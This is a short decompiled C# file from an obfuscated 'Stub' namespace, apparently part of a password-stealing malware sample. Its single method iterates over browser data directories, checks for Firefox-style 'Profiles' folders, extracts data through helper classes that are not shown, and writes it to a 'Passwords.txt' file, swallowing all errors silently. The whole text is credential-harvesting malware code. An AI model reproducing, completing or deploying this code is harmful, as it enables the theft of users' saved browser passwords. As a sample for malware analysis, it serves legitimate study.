using System;
using System.IO;

namespace Stub
{
	// Token: 0x02000004 RID: 4
	public class Class0
	{
		// Token: 0x06000003 RID: 3 RVA: 0x00002540 File Offset: 0x00000740
		public static void smethod_0(string String_0)
		{
			foreach (string text in Class25.String_1)
			{
				try
				{
					string name = new DirectoryInfo(text).Name;
					String_0 + "\\" + name;
					string text2 = Class25.String_3 + "\\" + text;
					if (Directory.Exists(text2 + "\\Profiles"))
					{
						Class14.smethod_7(Class18.smethod_1(text2), Class30.String_3 + "\\Passwords.txt");
					}
				}
				catch
				{
				}
			}
		}
	}
}
